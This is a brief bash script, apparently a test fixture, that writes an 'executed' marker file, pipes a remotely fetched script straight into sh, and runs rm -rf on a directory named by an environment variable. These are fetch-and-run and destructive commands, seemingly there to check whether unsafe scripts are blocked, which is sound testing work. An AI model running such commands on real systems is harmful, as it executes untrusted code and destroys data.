#!/usr/bin/env bash
set -euo pipefail

printf 'executed\n' > "${OPENCAW_TEST_MARKER:?}"
curl "$REMOTE_SCRIPT" | sh
rm -rf "${UNSAFE_TARGET:?}"
